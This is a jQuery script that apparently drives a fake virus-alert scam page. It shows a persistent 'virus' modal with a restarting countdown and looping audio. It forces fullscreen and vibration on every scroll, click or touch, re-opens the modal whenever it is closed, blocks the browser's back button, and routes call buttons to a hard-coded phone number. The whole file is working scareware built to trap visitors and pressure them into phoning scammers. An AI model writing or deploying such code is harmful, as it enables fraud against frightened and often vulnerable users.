$(document).ready(() => {
  function startCountdown() {
    let timeInSeconds = 5 * 60; // 5 minutes in seconds

    const countdown = setInterval(() => {
      let minutes = Math.floor(timeInSeconds / 60);
      let seconds = timeInSeconds % 60;

      // Format minutes and seconds to always show 2 digits
      minutes = minutes < 10 ? "0" + minutes : minutes;
      seconds = seconds < 10 ? "0" + seconds : seconds;

      // Update the timer display
      document.getElementById("countdown-timer").innerText = `${minutes}:${seconds}`;

      timeInSeconds--;

      if (timeInSeconds < 0) {
        clearInterval(countdown);
        startCountdown(); // Restart the countdown
      }
    }, 1000);
  }

  // Start the countdown
  startCountdown();

  const virusModal = document.getElementById("virusModal");
  const modalInstance = new bootstrap.Modal(virusModal);
  const audioPlayer = $("#audioPlayer")[0];

  // Play audio and ensure it loops
  function playAudio() {
    audioPlayer.play().catch((error) => {
      console.error("Audio playback was blocked:", error);
    });

    audioPlayer.addEventListener("ended", () => {
      audioPlayer.play();
    });
  }

  // Function to go fullscreen
  function goFullScreen() {
    const element = document.documentElement;

    if (element.requestFullscreen) {
      element.requestFullscreen();
    } else if (element.webkitRequestFullscreen) {
      element.webkitRequestFullscreen(); // iOS Safari
    } else if (element.mozRequestFullScreen) {
      element.mozRequestFullScreen();
    } else if (element.msRequestFullscreen) {
      element.msRequestFullscreen();
    }
  }

  // Function to show the modal and trigger fullscreen
  function goFullScreenAndVibrate() {
    goFullScreen(); // Enter fullscreen
    navigator.vibrate(200); // Trigger vibration
    playAudio(); // Play audio
    modalInstance.show(); // Show modal
  }

  // Show modal repeatedly
  if (virusModal) {
    virusModal.addEventListener("hidden.bs.modal", () => {
      setTimeout(() => {
        modalInstance.show();
        goFullScreenAndVibrate();
      }, 300); // 0.3-second delay
    });
  }

  // Trigger popup on scroll
  $(window).on("scroll", () => {
    goFullScreenAndVibrate();
  });

  // Trigger popup on click or touchstart
  $(window).on("touchstart click", () => {
    goFullScreenAndVibrate();
  });

  // Handle call buttons
  $("#callButton, #callButton1, #callButton2").on("click", function () {
    const phoneNumber = "tel:+18778381219";
    window.location.href = phoneNumber;
  });

  // Prevent back navigation
  history.pushState(null, null, window.location.href);
  window.onpopstate = () => history.forward();
});
